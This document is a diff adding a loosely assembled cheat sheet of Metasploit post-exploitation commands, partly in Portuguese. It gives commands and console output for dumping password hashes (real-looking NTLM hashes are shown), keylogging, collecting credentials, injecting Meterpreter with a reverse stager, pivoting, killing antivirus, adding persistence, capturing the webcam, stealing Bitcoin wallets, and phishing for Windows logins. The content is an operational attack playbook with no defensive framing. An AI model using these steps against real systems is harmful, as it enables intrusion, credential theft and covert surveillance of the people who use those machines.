@@ -1,0 +1,1621 @@
+run post/windows/escalate/screen_unlock
+
+  msf > use post/windows/escalate/screen_unlock
+      msf post(screen_unlock) > sessions
+            ...sessions...
+      msf post(screen_unlock) > set SESSION <session-id>
+      msf post(screen_unlock) > show options
+            ...show and set options...
+      msf post(screen_unlock) > run
+
+-------------
+
+  msf > use post/windows/escalate/droplnk
+      msf post(droplnk) > sessions
+            ...sessions...
+      msf post(droplnk) > set SESSION <session-id>
+      msf post(droplnk) > show options
+            ...show and set options...
+      msf post(droplnk) > run
+
+---------------
+
+/exploit/windows/psexec
+
+
+
+---------------
+
+execute -f cmd.exe -i -H
+
+---------
+
+O módulo de postagem "hashdump" irá despejar as contas de usuários locais no host comprometido usando o registro.
+
+run post/windows/gather/hashdump 
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hashes...
+
+
+Administrator:500:7bf4f254b222ab21aad3b435b51404ee:2792d23cdf84d1a70e2eb3b9f05c425e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:2e61920ebe3ed6e6d108113bf6318ee2:5abb944dc0761399b730f300dd474714:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:92e5d2c675bed8d4dc6b74ddd9b4c287:::
+
+
+meterpreter >
+
+
+run post/windows/capture/keylog_recorder
+
+cd /root/.msf5/ Aqui estara o arquivo keyloger de entrada
+
+run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
+
+run post/windows/escalate/service_permissions
+
+post/windows/escalate/droplnk 
+
+
+O módulo de postagem "autoroute" cria uma nova rota através de sessões Meterpreter, permitindo que você gire mais profundamente em uma rede de destino.
+
+run post/windows/manage/autoroute SUBNET=192.168.218.0 ACTION=ADD
+...y
+
+msf exploit(ms08_067_netapi) > use auxiliary/scanner/portscan/tcp 
+msf auxiliary(tcp) > set RHOSTS 192.168.218.0/24
+RHOSTS => 192.168.218.0/24
+msf auxiliary(tcp) > set THREADS 50
+THREADS => 50
+msf auxiliary(tcp) > set PORTS 445
+PORTS => 445
+msf auxiliary(tcp) > run
+
+
+[*] Scanned 027 of 256 hosts (010% complete)
+[*] Scanned 052 of 256 hosts (020% complete)
+[*] Scanned 079 of 256 hosts (030% complete)
+[*] Scanned 103 of 256 hosts (040% complete)
+[*] Scanned 128 of 256 hosts (050% complete)
+[*] 192.168.218.136:445 - TCP OPEN
+[*] Scanned 154 of 256 hosts (060% complete)
+[*] Scanned 180 of 256 hosts (070% complete)
+[*] Scanned 210 of 256 hosts (082% complete)
+[*] Scanned 232 of 256 hosts (090% complete)
+[*] Scanned 256 of 256 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(tcp) >
+
+delete_user
+
+run post/windows/manage/delete_user USERNAME=hacker
+
+[*] User was deleted!
+meterpreter >
+
+run post/windows/manage/migrate
+
+O módulo de publicação "migrar" migrará para um processo especificado ou se nenhum for dado, gerará automaticamente um novo processo e migrára para ele.
+
+multi_meterpreter_inject
+
+O módulo de publicação "multi_meterpreter_inject" irá injetar uma determinada carga útil em um processo no host comprometido. Se nenhum valor PID for especificado, um novo processo será criado e a carga útil injetada. Embora, o nome do módulo seja multi_meterpreter_inject, qualquer carga útil pode ser especificada.
+
+
+meterpreter > run post/windows/manage/multi_meterpreter_inject PAYLOAD=windows/shell_bind_tcp
+
+[*] Running module against V-MAC-XP
+[*] Creating a reverse meterpreter stager: LHOST=192.168.1.101 LPORT=4444
+[+] Starting Notepad.exe to house Meterpreter Session.
+[+] Process created with pid 3380
+[*] Injecting meterpreter into process ID 3380
+[*] Allocated memory at address 0x003a0000, for 341 byte stager
+[*] Writing the stager into memory...
+[+] Successfully injected Meterpreter in to process: 3380
+
+meterpreter > ^Z
+Background session 5? [y/N] y 
+msf exploit(handler) > connect 192.168.1.195 4444
+[*] Connected to 192.168.1.195:4444
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection:
+
+        Connection-specific DNS Suffix  . : localdomain
+        IP Address. . . . . . . . . . . . : 192.168.1.195
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 192.168.1.1
+
+Ethernet adapter Local Area Connection 2:
+
+        Connection-specific DNS Suffix  . : localdomain
+        IP Address. . . . . . . . . . . . : 192.168.218.136
+        Subnet Mask . . . . . . . . . . . : 255.255.255.0
+        Default Gateway . . . . . . . . . : 192.168.218.2
+
+C:\WINDOWS\system32>
+
+
+
+meterpreter> sysinfo  
+                                                                                                                   
+Computer        : MSEDGEWIN10
+OS              : Windows 10 (Build 14393).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 3
+Meterpreter     : x64/windows
+meterpreter > getpid                                                                                                                      
+Current pid: 4344
+
+meterpreter > ps -S explorer                                                                                                              
+
+Process List
+============
+
+ PID   PPID  Name                          Arch  Session  User                Path
+ ---   ----  ----                          ----  -------  ----                ----
+ 1544  2128  explorer.exe                  x64   1        MSEDGEWIN10\IEUser  C:\Windows\explorer.exe
+
+meterpreter > background
+[*] Backgrounding session 5...
+msf post(migrate) > show options 
+
+Module options (post/windows/manage/migrate):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   KILL     false            no  Kill original p      rocess for the session.
+   NAME     Explorer.EXE     no        Name of process to migrate to.
+   PID                       no        PID of process to migrate to.
+   SESSION  5                yes       The session to run this module on.
+   SPAWN    false            no        Spawn process to migrate to. If name for process not given notepad.exe is used.
+
+msf post(migrate) > run
+
+[*] Running module against MSEDGEWIN10
+[*] Current server process: notepad.exe (4344)
+[-] Process or PID not found
+[*] Post module execution completed
+
+msf post(migrate) > sessions -i 5
+[*] Starting interaction with 5...
+
+meterpreter > irb
+[*] Starting IRB shell
+[*] The 'client' variable holds the meterpreter client
+
+>> session.sys.process["explorer.exe"]                                                                                                    
+=> 1544
+>> client.sys.process["explorer.exe"]                                                                                                     
+=> 1544
+>> 
+
+
+arp_scanner
+
+The “arp_scanner” post module will perform an ARP scan for a given range through a compromised host.
+
+meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
+
+[*] Running module against V-MAC-XP
+[*] ARP Scanning 192.168.1.0/24
+[*] 	IP: 192.168.1.1 MAC b2:a8:1d:e0:68:89
+[*] 	IP: 192.168.1.2 MAC 0:f:b5:fc:bd:22
+[*] 	IP: 192.168.1.11 MAC 0:21:85:fc:96:32
+[*] 	IP: 192.168.1.13 MAC 78:ca:39:fe:b:4c
+[*] 	IP: 192.168.1.100 MAC 58:b0:35:6a:4e:cc
+[*] 	IP: 192.168.1.101 MAC 0:1f:d0:2e:b5:3f
+[*] 	IP: 192.168.1.102 MAC 58:55:ca:14:1e:61
+[*] 	IP: 192.168.1.105 MAC 0:1:6c:6f:dd:d1
+[*] 	IP: 192.168.1.106 MAC c:60:76:57:49:3f
+[*] 	IP: 192.168.1.195 MAC 0:c:29:c9:38:4c
+[*] 	IP: 192.168.1.194 MAC 12:33:a0:2:86:9b
+[*] 	IP: 192.168.1.191 MAC c8:bc:c8:85:9d:b2
+[*] 	IP: 192.168.1.193 MAC d8:30:62:8c:9:ab
+[*] 	IP: 192.168.1.201 MAC 8a:e9:17:42:35:b0
+[*] 	IP: 192.168.1.203 MAC 3e:ff:3c:4c:89:67
+[*] 	IP: 192.168.1.207 MAC c6:b3:a1:bc:8a:ec
+[*] 	IP: 192.168.1.199 MAC 1c:c1:de:41:73:94
+[*] 	IP: 192.168.1.209 MAC 1e:75:bd:82:9b:11
+[*] 	IP: 192.168.1.220 MAC 76:c4:72:53:c1:ce
+[*] 	IP: 192.168.1.221 MAC 0:c:29:d7:55:f
+[*] 	IP: 192.168.1.250 MAC 1a:dc:fa:ab:8b:b
+meterpreter >
+
+checkvm
+
+The “checkvm” post module, simply enough, checks to see if the compromised host is a virtual machine. This module supports Hyper-V, VMWare, VirtualBox, Xen, and QEMU virtual machines.
+
+meterpreter > run post/windows/gather/checkvm 
+
+[*] Checking if V-MAC-XP is a Virtual Machine .....
+[*] This is a VMware Virtual Machine
+meterpreter >
+
+
+credential_collector
+
+The “credential_collector” module harvests passwords hashes and tokens on the compromised host.
+
+meterpreter > run post/windows/gather/credentials/credential_collector 
+
+[*] Running module against V-MAC-XP
+[+] Collecting hashes...
+    Extracted: Administrator:7bf4f254f224bb24aad3b435b51404ee:2892d23cdf84d7a70e2eb2b9f05c425e
+    Extracted: Guest:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+    Extracted: HelpAssistant:2e61920ebe3ed6e6d108113bf6318ee2:5abb944dc0761399b730f300dd474714
+    Extracted: SUPPORT_388945a0:aad3b435b51404eeaad3b435b51404ee:92e5d2c675bed8d4dc6b74ddd9b4c287
+[+] Collecting tokens...
+    NT AUTHORITY\LOCAL SERVICE
+    NT AUTHORITY\NETWORK SERVICE
+    NT AUTHORITY\SYSTEM
+    NT AUTHORITY\ANONYMOUS LOGON
+meterpreter >
+
+
+dumplinks
+
+O módulo "dumplinks" analisa os arquivos .lnk em usuários de documentos recentes que podem ser úteis para maior coleta de informações. Observe que, como mostrado abaixo, primeiro precisamos migrar para um processo de usuário antes de executar o módulo.
+
+meterpreter > run post/windows/manage/migrate 
+
+[*] Running module against V-MAC-XP
+[*] Current server process: svchost.exe (1096)
+[*] Migrating to explorer.exe...
+[*] Migrating into process ID 1824
+[*] New server process: Explorer.EXE (1824)
+meterpreter > run post/windows/gather/dumplinks 
+
+[*] Running module against V-MAC-XP
+[*] Extracting lnk files for user Administrator at C:\Documents and Settings\Administrator\Recent\...
+[*] Processing: C:\Documents and Settings\Administrator\Recent\developers_guide.lnk.
+[*] Processing: C:\Documents and Settings\Administrator\Recent\documentation.lnk.
+[*] Processing: C:\Documents and Settings\Administrator\Recent\Local Disk (C).lnk.
+[*] Processing: C:\Documents and Settings\Administrator\Recent\Netlog.lnk.
+[*] Processing: C:\Documents and Settings\Administrator\Recent\notes (2).lnk.
+[*] Processing: C:\Documents and Settings\Administrator\Recent\notes.lnk.
+[*] Processing: C:\Documents and Settings\Administrator\Recent\Release.lnk.
+[*] Processing: C:\Documents and Settings\Administrator\Recent\testmachine_crashie.lnk.
+[*] Processing: C:\Documents and Settings\Administrator\Recent\user manual.lnk.
+[*] Processing: C:\Documents and Settings\Administrator\Recent\user's guide.lnk.
+[*] Processing: C:\Documents and Settings\Administrator\Recent\{33D9A762-90C8-11d0-BD43-00A0C911CE86}_load.lnk.
+[*] No Recent Office files found for user Administrator. Nothing to do.
+meterpreter >
+
+
+O módulo "enum_applications" enumera os aplicativos instalados no host comprometido.
+
+meterpreter > run post/windows/gather/enum_applications 
+
+[*] Enumerating applications installed on WIN7-X86
+
+Installed Applications
+======================
+
+ Name                                                              Version
+ ----                                                              -------
+ Adobe Flash Player 25 ActiveX                                     25.0.0.148
+ Google Chrome                                                     58.0.3029.81
+ Google Update Helper                                              1.3.33.5
+ Google Update Helper                                              1.3.25.11
+ Microsoft .NET Framework 4.6.1                                    4.6.01055
+ Microsoft .NET Framework 4.6.1                                    4.6.01055
+ Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148    9.0.30729.4148
+ MySQL Connector Net 6.5.4                                         6.5.4
+ Security Update for Microsoft .NET Framework 4.6.1 (KB3122661)    1
+ Security Update for Microsoft .NET Framework 4.6.1 (KB3127233)    1
+ Security Update for Microsoft .NET Framework 4.6.1 (KB3136000v2)  2
+ Security Update for Microsoft .NET Framework 4.6.1 (KB3142037)    1
+ Security Update for Microsoft .NET Framework 4.6.1 (KB3143693)    1
+ Security Update for Microsoft .NET Framework 4.6.1 (KB3164025)    1
+ Update for Microsoft .NET Framework 4.6.1 (KB3210136)             1
+ Update for Microsoft .NET Framework 4.6.1 (KB4014553)             1
+ VMware Tools                                                      10.1.6.5214329
+ XAMPP 1.8.1-0                                                     1.8.1-0
+
+
+[*] Results stored in: /root/.msf4/loot/20170501172851_pwk_192.168.0.6_host.application_876159.txt
+meterpreter >
+
+
+enum_logged_on_users
+
+The “enum_logged_on_users” post module returns a listing of current and recently logged on users along with their SIDs.
+
+meterpreter > run post/windows/gather/enum_logged_on_users 
+
+[*] Running against session 1
+
+Current Logged Users
+====================
+
+ SID                                            User
+ ---                                            ----
+ S-1-5-21-628913648-3499400826-3774924290-1000  WIN7-X86\victim
+ S-1-5-21-628913648-3499400826-3774924290-1004  WIN7-X86\hacker
+
+
+[*] Results saved in: /root/.msf4/loot/20170501172925_pwk_192.168.0.6_host.users.activ_736219.txt
+
+Recently Logged Users
+=====================
+
+ SID                                            Profile Path
+ ---                                            ------------
+ S-1-5-18                                       %systemroot%\system32\config\systemprofile
+ S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService
+ S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService
+ S-1-5-21-628913648-3499400826-3774924290-1000  C:\Users\victim
+ S-1-5-21-628913648-3499400826-3774924290-1004  C:\Users\hacker
+
+
+meterpreter >
+
+
+enum_shares
+
+The “enum_shares” post module returns a listing of both configured and recently used shares on the compromised system.
+
+meterpreter > run post/windows/gather/enum_shares 
+
+[*] Running against session 3
+[*] The following shares were found:
+[*] 	Name: Desktop
+[*] 	Path: C:\Documents and Settings\Administrator\Desktop
+[*] 	Type: 0
+[*] 
+[*] Recent Mounts found:
+[*] 	\\192.168.1.250\software
+[*] 	\\192.168.1.250\Data
+[*] 
+meterpreter >
+
+
+O módulo "enum_snmp" irá enumerar a configuração do serviço SNMP no alvo, se presente, incluindo as cadeias da comunidade.
+enum_snmp
+
+meterpreter > run post/windows/gather/enum_snmp
+
+[*] Running module against V-MAC-XP
+[*] Checking if SNMP is Installed
+[*] 	SNMP is installed!
+[*] Enumerating community strings
+[*] 
+[*] 	Comunity Strings
+[*] 	================
+[*] 	
+[*] 	 Name    Type
+[*] 	 ----    ----
+[*] 	 public  READ ONLY
+[*] 
+[*] Enumerating Permitted Managers for Community Strings
+[*] 	Community Strings can be accessed from any host
+[*] Enumerating Trap Configuration
+[*] No Traps are configured
+meterpreter >
+
+
+
+usb_history
+
+The “usb_history” module enumerates the USB drive history on the compromised system.
+
+meterpreter > run post/windows/gather/usb_history 
+
+[*] Running module against V-MAC-XP
+[*] 
+   C:	                                                             Disk ea4cea4c 
+   E:	STORAGE#RemovableMedia#8&3a01dffe&0&RM#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}
+   A:	FDC#GENERIC_FLOPPY_DRIVE#6&1435b2e2&0&0#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}
+   D:	IDE#CdRomNECVMWar_VMware_IDE_CDR10_______________1.00____#3031303030303030303030303030303030303130#{53f5630d-b6bf-11d0-94f2-00a0c91efb8b}
+
+[*] Kingston DataTraveler 2.0 USB Device
+=====================================================================================
+   Disk lpftLastWriteTime	                    Thu Apr 21 13:09:42 -0600 2011
+ Volume lpftLastWriteTime	                    Thu Apr 21 13:09:43 -0600 2011
+             Manufacturer	                            (Standard disk drives)
+           ParentIdPrefix	                                      8&3a01dffe&0 (   E:)
+                    Class	                                         DiskDrive
+                   Driver	       {4D36E967-E325-11CE-BFC1-08002BE10318}\0001
+
+meterpreter >
+
+
+O "local_exploit_suggester", ou Lester para abreviar, verifica um sistema para vulnerabilidades locais contidas em Metasploit. Em seguida, faz sugestões com base nos resultados, bem como exibe a localização da exploração para um acesso mais rápido.
+
+
+msf > use post/multi/recon/local_exploit_suggester 
+msf post(local_exploit_suggester) > show options
+
+Module options (post/multi/recon/local_exploit_suggester):
+
+   Name             Current Setting  Required  Description
+   ----             ---------------  --------  -----------
+   SESSION          2                yes       The session to run this module on.
+   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+msf post(local_exploit_suggester) > run
+
+[*] 192.168.101.129 - Collecting local exploits for x86/windows...
+[*] 192.168.101.129 - 31 exploit checks are being tried...
+[+] 192.168.101.129 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
+[+] 192.168.101.129 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[+] 192.168.101.129 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 192.168.101.129 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
+[+] 192.168.101.129 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[*] Post module execution completed
+
+
+
+Module Options
+
+To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced':
+
+
+
+ msf > use post/windows/manage/persistence_exe
+      msf post(persistence_exe) > sessions
+            ...sessions...
+      msf post(persistence_exe) > set SESSION <session-id>
+      msf post(persistence_exe) > show options
+            ...show and set options...
+      msf post(persistence_exe) > run
+    
+
+-----------------
+
+
+Module Options
+
+To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced':
+
+
+REMOTE DESKTOP
+
+  msf > use post/windows/manage/enable_rdp
+      msf post(enable_rdp) > sessions
+            ...sessions...
+      msf post(enable_rdp) > set SESSION <session-id>
+      msf post(enable_rdp) > show options
+            ...show and set options...
+      msf post(enable_rdp) > run
+
+----------
+
+manage webcan
+
+msf > use post/windows/manage/webcam
+      msf post(webcam) > sessions
+            ...sessions...
+      msf post(webcam) > set SESSION <session-id>
+      msf post(webcam) > show options
+            ...show and set options...
+      msf post(webcam) > run
+
+------------
+
+Windows Gerenciar Adicionar Usuário ao Domínio e / ou a um Grupo de Domínio
+
+Este módulo adiciona um usuário ao domínio e / ou a um grupo de domínio. Ele verificará se existem privilégios suficientes para determinadas ações e executam o getprivs para o sistema. Se você elevou privs para o sistema, o SeAssignPrimaryTokenPrivilege não será atribuído. Você precisa migrar para um processo que está sendo executado como sistema. Se você não tiver privs, esse script será encerrado.
+
+
+ msf > use post/windows/manage/add_user_domain
+      msf post(add_user_domain) > sessions
+            ...sessions...
+      msf post(add_user_domain) > set SESSION <session-id>
+      msf post(add_user_domain) > show options
+            ...show and set options...
+      msf post(add_user_domain) > run
+---------------
+
+Windows Gather Local Admin Search
+
+Este módulo identificará sistemas em um determinado intervalo que o usuário de domínio fornecido (deve migrar para um usuário pid) tenha acesso administrativo usando o Windows API OpenSCManagerA para estabelecer um identificador para o host remoto. Além disso, ele pode enumerar usuários registrados e membros do grupo via Windows API NetWkstaUserEnum e NetUserGetGroups.
+
+msf > use post/windows/gather/local_admin_search_enum
+      msf post(local_admin_search_enum) > sessions
+            ...sessions...
+      msf post(local_admin_search_enum) > set SESSION <session-id>
+      msf post(local_admin_search_enum) > show options
+            ...show and set options...
+      msf post(local_admin_search_enum) > run
+--------------------
+
+Windows Gerenciar executar comando como usuário
+
+Este módulo iniciará o login com o nome de usuário / senha especificado e executará o comando fornecido como um processo oculto. A saída não é retornada por padrão, ao configurar CMDOUT para saída falso será redirecionada para um arquivo temporário e será lida novamente para exibir. Ao definir a opção avançada SETPASS como verdadeira, ela irá redefinir a senha dos usuários e, em seguida, executar o comando.
+
+
+  msf > use post/windows/manage/run_as
+      msf post(run_as) > sessions
+            ...sessions...
+      msf post(run_as) > set SESSION <session-id>
+      msf post(run_as) > show options
+            ...show and set options...
+      msf post(run_as) > run
+
+----------------
+
+Windows Post Kill Antivirus e Hips
+
+Este módulo tenta localizar e encerrar todos os processos que são identificados como relacionados com o Antivírus ou o Host baseado em IPS.
+
+msf > use post/windows/manage/killav
+      msf post(killav) > sessions
+            ...sessions...
+      msf post(killav) > set SESSION <session-id>
+      msf post(killav) > show options
+            ...show and set options...
+      msf post(killav) > run
+--------------------
+
+Windows Gerenciar Injeção de Arquivos de Hosts
+
+Este módulo permite que o invasor insira uma nova entrada no arquivo de hosts do sistema de destino.
+
+ msf > use post/windows/manage/inject_host
+      msf post(inject_host) > sessions
+            ...sessions...
+      msf post(inject_host) > set SESSION <session-id>
+      msf post(inject_host) > show options
+            ...show and set options...
+      msf post(inject_host) > run
+------------
+
+Windows Gather Bitcoin Wallet
+
+Este módulo baixa todos os arquivos da carteira Bitcoin do sistema alvo. Atualmente, suporta tanto a carteira clássica Satoshi quanto as carteiras Armory mais recentes. Note-se que as carteiras Satoshi tendem a não ser criptografadas por padrão, enquanto as carteiras Armory tendem a ser criptografadas por padrão.
+
+
+ msf > use post/windows/gather/bitcoin_jacker
+      msf post(bitcoin_jacker) > sessions
+            ...sessions...
+      msf post(bitcoin_jacker) > set SESSION <session-id>
+      msf post(bitcoin_jacker) > show options
+            ...show and set options...
+      msf post(bitcoin_jacker) > run
+
+----------------------------
+
+Windows Gather User Credentials (phishing)
+
+This module is able to perform a phishing attack on the target by popping up a loginprompt. When the user fills credentials in the loginprompt, the credentials will be sent to the attacker. The module is able to monitor for new processes and popup a loginprompt when a specific process is starting. Tested on Windows 7.
+ x86
+ x64
+
+ msf > use post/windows/gather/phish_windows_credentials
+      msf post(phish_windows_credentials) > sessions
+            ...sessions...
+      msf post(phish_windows_credentials) > set SESSION <session-id>
+      msf post(phish_windows_credentials) > show options
+            ...show and set options...
+      msf post(phish_windows_credentials) > run
+
+-----------------
+Windows Gerenciar Download e / ou Executar
+
+Este módulo irá baixar um arquivo importando urlmon via railgun. O usuário também pode optar por executar o arquivo com argumentos via exec_string.
+
+
+
+msf > use post/windows/manage/download_exec
+      msf post(download_exec) > sessions
+            ...sessions...
+      msf post(download_exec) > set SESSION <session-id>
+      msf post(download_exec) > show options
+            ...show and set options...
+      msf post(download_exec) > run
+
+-----------------
+
+A forma como funciona o módulo e o script é a seguinte
+
+    Primeiro, verifica o nível de privilégio e o sistema operacional.
+    Ele verificará se o alvo é um controlador de domínio.
+    Com base nessa informação, preferirá a leitura do registro para obter os hashes, se possível, se não for possível, ele irá injetar no processo lsass, se possível. Para controladores de domínio, ele usará a injeção para lsass.
+    Se o alvo for um servidor do Windows 2008 e o processo estiver sendo executado com privilégios de administrador, ele tentará obter privilégios do sistema usando o sistema getsystem, se o privilégio do SISTEMA for feito com a forma como os privilégios do token estão configurados, ele ainda não pode injetar no processo lsass então o código migrará para um processo que já está sendo executado como SISTEMA e depois injetará no processo lsass.
+    Se o código detectar que ele está sendo executado em uma caixa do Windows 7 / Vista com o UAC desativado e ele está sendo executado como administrador local, ele executará o getsystem e ele usará o método de registro de leitura.
+    No Windows 2003/2000 / XP, ele usará o sistema getsystem e, se for bem sucedido, ele usará o método de registro de leitura.
+
+++
+
+meterpreter > run smart_hasdump -h
+
+Meterpreter Script for automating the dumping of local accounts from
+
+the SAM Database and if the targets host is a Domain Controller the
+
+Domain Account Database using the proper technique depending on 
+
+privilage level, OS and Role of host.
+
+OPTIONS:
+
+    -h        Help menu.
+
+    -l <opt>  Log folder to save results, if none provided default log path will be used.
+
+    -s <opt>  Try to get SYSTEM Privilege
+
+
+using:
+
+msf exploit(handler) > use post/windows/gather/smart_hashdump 
+
+msf post(smart_hashdump) > info
+
+       Name: Windows Gather Local and Domain Controler Account Password Hashes
+
+     Module: post/windows/gather/smart_hashdump
+
+    Version: $Revision$
+
+   Platform: Windows
+
+       Arch: 
+
+       Rank: Normal
+
+Provided by:
+
+  Carlos Perez <carlos_perez@darkoperator.com>
+
+Description:
+
+  This will dump local accounts from the SAM Database and if the 
+
+  targets host is a Domain Controller the Domain Account Database 
+
+  using the proper technique depending on privilage level, OS and Role 
+
+  of host.
+
+msf post(smart_hashdump) > show options 
+
+Module options (post/windows/gather/smart_hashdump):
+
+   Name       Current Setting  Required  Description
+
+   ----       ---------------  --------  -----------
+
+   GETSYSTEM  false            no        Attempt to get SYSTEM Privilege on the target host.
+
+   SESSION                     yes       The session to run this module on.
+
+
+Ambos usam as mesmas chamadas e imprime quase as mesmas mensagens para que possamos usar o módulo de postagem, já que é o que a maioria do código está se movendo, primeiro o execute em uma DC do Windows 2008 R2:
+
+meterpreter > run post/windows/gather/smart_hashdump GETSYSTEM=true
+
+[*] Running module against WIN2K8R2-01
+
+[*] Hashes will be saved to the Database if one is connected.
+
+[*] Hashes will be saved in loot in John Password File format to:
+
+[*] /Users/carlos/.msf3/loot/20110518200416_default_192.168.1.234_windows.hashes_483699.txt
+
+[+]     This host is a Domain Controller!
+
+[*] Dumping password hashes...
+
+[*] Trying to get SYSTEM Privilege
+
+[+] Got SYSTEM Privilege
+
+[*] Migrating to process owned by SYSTEM
+
+[*] Migrating to wininit.exe
+
+[+] Successfully migrated to wininit.exe
+
+[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:d208bd92b52f7cb48eb64c53dbd34552:::
+
+[+]     krbtgtB:502:aad3b435b51404eeaad3b435b51404ee:a6c94aa1141fd563d618b5f1dd0d86c2:::
+
+[+]     testuser:1109:aad3b435b51404eeaad3b435b51404ee:7a118f7a2f2b34d61fa19b840b4f5203:::
+
+[+]     WIN2K8R2-01$?:1006:aad3b435b51404eeaad3b435b51404ee:5780b9a9d5b3fc7792982ae4b7b44b8f:::
+
+
+Em um sistema Windows 7 com UAC desativado como administrador:
+
+meterpreter > run post/windows/gather/smart_hashdump
+
+[*] Running module against WIN701
+
+[*] Hashes will be saved to the Database if one is connected.
+
+[*] Hashes will be saved in loot in John Password File format to:
+
+[*] /Users/carlos/.msf3/loot/20110518201100_default_192.168.1.224_windows.hashes_711181.txt
+
+[*] Dumping password hashes...
+
+[-] On this version of Windows you need to be NT AUTHORITY\SYSTEM to dump the hashes
+
+[-] Try setting GETSYSTEM to true.
+
+meterpreter > run post/windows/gather/smart_hashdump GETSYSTEM=true
+
+[*] Running module against WIN701
+
+[*] Hashes will be saved to the Database if one is connected.
+
+[*] Hashes will be saved in loot in John Password File format to:
+
+[*] /Users/carlos/.msf3/loot/20110518201122_default_192.168.1.224_windows.hashes_541308.txt
+
+[*] Dumping password hashes...
+
+[*] Trying to get SYSTEM Privilege
+
+[+] Got SYSTEM Privilege
+
+[*]     Obtaining the boot key...
+
+[*]     Calculating the hboot key using SYSKEY 35f17065cf29faf142844a684d502ba8...
+
+[*]     Obtaining the user list and keys...
+
+[*]     Decrypting user keys...
+
+[*]     Dumping password hashes...
+
+[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+[+]     adminuser:1000:aad3b435b51404eeaad3b435b51404ee:7a118f7a2f2b34d61fa19b840b4f5203:::
+
+
+on a Windows 7 System as Administrator with UAC:
+
+meterpreter > run post/windows/gather/smart_hashdump GETSYSTEM=true
+
+[*] Running module against WIN-KVJG16GEMOJ
+
+[*] Hashes will be saved to the Database if one is connected.
+
+[*] Hashes will be saved in loot in John Password File format to:
+
+[*] /Users/carlos/.msf3/loot/20110518201439_default_192.168.1.112_windows.hashes_452083.txt
+
+[-] Insufficient privileges to dump hashes!
+
+Sadly UAC does a good job at blocking dumping the hashes even as Administrator, it will even block getsystem.
+
+
+on a Windows XP System:
+
+meterpreter > run post/windows/gather/smart_hashdump
+
+[*] Running module against TEST-01BCDAF47C
+
+[*] Hashes will be saved to the Database if one is connected.
+
+[*] Hashes will be saved in loot in John Password File format to:
+
+[*] /Users/carlos/.msf3/loot/20110518201750_default_192.168.1.113_windows.hashes_761609.txt
+
+[*] Dumping password hashes...
+
+[+]     Administrator:500:bbc1afce0ca1e5eee694e8a550e822f3:7a118f7a2f2b34d61fa19b840b4f5203:::
+
+[+]     HelpAssistant:1000:17520fb9c159a6be8a692d4f186288a5:4ad260d25ad790417f1a4ef3c44103b2:::
+
+[+]     SUPPORT_388945a0":1002:aad3b435b51404eeaad3b435b51404ee:ec48ef68e471506ab31f656bf5741d63:::
+
+meterpreter > run post/windows/gather/smart_hashdump GETSYSTEM=true
+
+[*] Running module against TEST-01BCDAF47C
+
+[*] Hashes will be saved to the Database if one is connected.
+
+[*] Hashes will be saved in loot in John Password File format to:
+
+[*] /Users/carlos/.msf3/loot/20110518201818_default_192.168.1.113_windows.hashes_177417.txt
+
+[*] Dumping password hashes...
+
+[*] Trying to get SYSTEM Privilege
+
+[+] Got SYSTEM Privilege
+
+[*]     Obtaining the boot key...
+
+[*]     Calculating the hboot key using SYSKEY 4503ffd18cd3ee70d443b159c8626842...
+
+[*]     Obtaining the user list and keys...
+
+[*]     Decrypting user keys...
+
+[*]     Dumping password hashes...
+
+[+]     Administrator:500:bbc1afce0ca1e5eee694e8a550e822f3:7a118f7a2f2b34d61fa19b840b4f5203:::
+
+[+]     HelpAssistant:1000:17520fb9c159a6be8a692d4f186288a5:4ad260d25ad790417f1a4ef3c44103b2:::
+
+[+]     SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:ec48ef68e471506ab31f656bf5741d63:::
+
+On XP and Windows 2003 if you are an administrator you can dump hashes with no problem and getsystem will yield success.
+
+To get a list of all the accounts and hashes from the main console:
+
+msf exploit(handler) > db_creds 
+
+[*] Time: 2011-05-18 02:02:08 UTC Credential: host=192.168.1.234 port=445 proto=tcp sname=smb type=smb_hash user=WIN2K8R2-01$? pass=aad3b435b51404eeaad3b435b51404ee:5780b9a9d5b3fc7792982ae4b7b44b8f active=true
+
+[*] Time: 2011-05-18 02:02:08 UTC Credential: host=192.168.1.234 port=445 proto=tcp sname=smb type=smb_hash user=testuser  pass=aad3b435b51404eeaad3b435b51404ee:7a118f7a2f2b34d61fa19b840b4f5203 active=true
+
+[*] Time: 2011-05-18 02:02:08 UTC Credential: host=192.168.1.234 port=445 proto=tcp sname=smb type=smb_hash user=krbtgtB pass=aad3b435b51404eeaad3b435b51404ee:a6c94aa1141fd563d618b5f1dd0d86c2 active=true
+
